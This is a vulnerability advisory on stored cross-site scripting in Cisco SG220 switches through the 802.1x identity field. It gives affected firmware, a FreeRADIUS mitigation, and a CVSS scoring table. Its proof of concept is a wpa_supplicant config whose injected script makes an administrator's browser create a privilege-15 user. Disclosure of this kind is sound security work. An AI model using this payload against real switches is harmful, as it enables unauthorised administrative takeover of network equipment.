Vulnerability description

The Cisco SG220 series

The SG220 series is a range of switches provided by Cisco to small businesses which “bridge the gap between managed
and smart switches to offer customers the best of both worlds” and “provide the higher levels of security, management, and
scalability you expect from managed switches, affordably priced like smart switches”.

The issue

When a 802.1x certificate-based port authentication is configured, Synacktiv has identified a vulnerability in the Cisco SG220
series allowing attackers acting from the internal network to inject malicious JavaScript code which is next triggered and
executed by the switch's administrators. From this point, an attacker could perform highly privileged actions on the switch
regarding the victim's privileges (add users, disable security features, leak secrets, etc.).

This issue is the result of a missing encoding process when an administrator displays usernames used during the 802.1x
authentication process (Security → 802.1x → Port Authentication):

Note that the malicious JavaScript code is injected in the switch web interface only if the 802.1x authentication succeeded.
Consequently, only attackers with valid 802.1x credentials can exploit the vulnerability.

Affected versions

The following versions has been proved to be affected:

•

•

Smart Plus Switch Firmware 1.0.0.17;

Smart Plus Switch Firmware 1.0.0.18.

Mitigation

For the moment, no  official mitigation exists as we  have  just contacted the Cisco  Product Security Incident Response.
However, additional security checks can be configured on the RADIUS server in order to check the user identity.

 2/7

For example, setting the following check in the policy.d/filter file in FreeRADIUS will indireclty fix the issue:

filter_username {
        if (&User­Name !~ /^[a­zA­Z0­9@.­]+$/) {
                reject
        }
[…]
}

Technical description and proof-of-concept

Attack scenario

To illustrate our proof-of-concept, the chosen scenario  is an attacker acting from the internal network  with valid 802.1x
credentials. In that case, the attacker can inject a malicious user identity containing JavaScript code during the 802.1x
authentication.

Once   the   802.1x   authentication   is   done   and   as   long   as   the   attacker   stays   connected   to   the   network,   if   an   switch's
administrator access the “Port Authentication” web page, he will trigger the malicious payload.

The JavaScript payload can  next perform actions on  the administrator behalf such as creating users, disabling security
features, etc.

This attack can be illustrated by the following schema:

Vulnerability discovery

To trigger the vulnerability, the remote switch must be configured to perform 802.1x certificate-based authentication on the
port used by the attacker (Security → 802.1x → Port Authentication):

 4/7

Note that the switch must also be connected to a RADIUS server to successfully authenticate users.

Once the environment is set up, playing with 802.1x is an easy thing with Linux and  wpa_supplicant. For example, the
following wpa_supplicant configuration will perform a 802.1x certificate-based authentication:

ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=0
eapol_version=2
ap_scan=0

network={
        id_str="lan"
        eap=TLS
        key_mgmt=IEEE8021X
        ca_cert="/tmp/ca.pem"
        subject_match="/C=FR/ST=IDF/L=Paris/O=MyOrg/CN=MyServ"
        client_cert="/tmp/mycert.crt"
        private_key="/tmp/mykey.key"
        private_key_passwd="mypassword"
        identity="myidentity@lan"
}

The interesting thing here is the identity parameter. Indeed, during a 802.1x certificate-based authentication, this parameter
is unused (only the user's public certificate and private key is actually used). Consequently, an attacker can insert whatever
he wants such as JavaScript code for example. Note that whitespaces are denied in the payload:

ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=0
eapol_version=2
ap_scan=0

network={
        id_str="lan"
        eap=TLS
        key_mgmt=IEEE8021X
        ca_cert="/tmp/ca.pem"
        subject_match="/C=FR/ST=IDF/L=Paris/O=MyOrg/CN=MyServ"
        client_cert="/tmp/mycert.crt"
        private_key="/tmp/mykey.key"
        private_key_passwd="mypassword"
        identity="me<script>alert('Rulez!')</script>@lan"

 5/7

}

This parameter is however reused by the Cisco switch to display the user identity in the switch's web interface but this data is
not encoded:

Impact

A successful exploitation could allow an attacker acting from the internal network with valid 802.1x credentials  to trick an
authenticated user and perform privileged actions on their behalf such as adding a new administrator user account, disable
security features, leaking secrets, etc.

Proof of concept

The following wpa_supplicant configuration will lead an administrator to create a new level 15 user:

ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=0
eapol_version=2
ap_scan=0

network={
        id_str="lan"
        eap=TLS
        key_mgmt=IEEE8021X
        ca_cert="/tmp/ca.pem"
        subject_match="/C=FR/ST=IDF/L=Paris/O=MyOrg/CN=MyServ"
        client_cert="/tmp/mycert.crt"
        private_key="/tmp/mykey.key"
        private_key_passwd="mypassword"
        identity="me<script>$.ajax({type:'POST',url:'/cgi/set.cgi?
cmd=aaa_userAdd&dummy=146019899',data:'{\"_ds=1&userName=kikoo1234&password=Abcdefghijkl_2&
confirmPassword=Abcdefghijkl_2&priv=15&_de=1\":
{}}',contentType:'application/json'})</script>@lan"
}

After browsing the “Port Authentication” web page with a level 15 user account, the new user is created:

| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Access Vector AV: Local AV: Adjacent Network AV: Network  Access Complexity AC: High AC: Medium AC: Low  Authentication Au: Multiple Au: Single Au: None  Confidentiality Impact C: None C: Partial C: Complete  Integrity Impact I: None I: Partial I: Complete  Availability Impact A: None A: Partial A: Complete     Base Score: 4.3 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploitability E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   **Exploitability**  ---   Unproven (U) No exploit code is available, or an exploit is entirely theoretical. Proof-of-Concept (POC) Proof-of-concept exploit code or an attack demonstration that is not practical for most systems is available. The code or technique is not functional in all situations and may require substantial modification by a skilled attacker.  Functional (F) Functional exploit code is available. The code works in most situations where the vulnerability exists.  High (H) Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available. The code works in every situation, or is actively being delivered via a mobile autonomous agent (such as a worm or virus).  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   **Remediation Level**  ---   Official Fix (OF)  A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available. Temporary Fix (TF) There is an official but temporary fix available. This includes instances where the vendor issues a temporary hotfix, tool, or workaround.  Workaround (W)  There is an unofficial, non-vendor solution available. In some cases, users of the affected technology will create a patch of their own or provide steps to work around or otherwise mitigate the vulnerability.  Unavailable (U)  There is either no solution available or it is impossible to apply.  Not Defined (ND)  Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Report Confidence RC: Unconfirmed  RC: Uncorroborated  RC: Confirmed  RC: Not Defined   **Report Confidence**  ---   Unconfirmed (UC) There is a single unconfirmed source or possibly multiple conflicting reports. There is little confidence in the validity of the reports. An example is a rumor that surfaces from the hacker underground. Uncorroborated (UR) There are multiple non-official sources, possibly including independent security companies or research organizations. At this point there may be conflicting technical details or some other lingering ambiguity.  Confirmed (C) The vulnerability has been acknowledged by the vendor or author of the affected technology. The vulnerability may also be ?Confirmed? when its existence is confirmed from an external event such as publication of functional or proof-of-concept exploit code or widespread exploitation.  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.     Temporal Score: 3.6 |

| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Collateral Damage Potential CDP: None  CDP: Low  CDP: Low-Medium  CDP: Medium-High  CDP: High  CDP: Not Defined   Target Distribution TD: None  TD: Low  TD: Medium  TD: High  TD: Not Defined   Confidentiality Requirement CR: Not Defined  CR: Low  CR: Medium  CR: High   Integrity Requirement IR: Not Defined  IR: Low  IR: Medium  IR: High   Availability Requirement AR: Not Defined  AR: Low  AR: Medium  AR: High      Environmental Score: 3.6 |
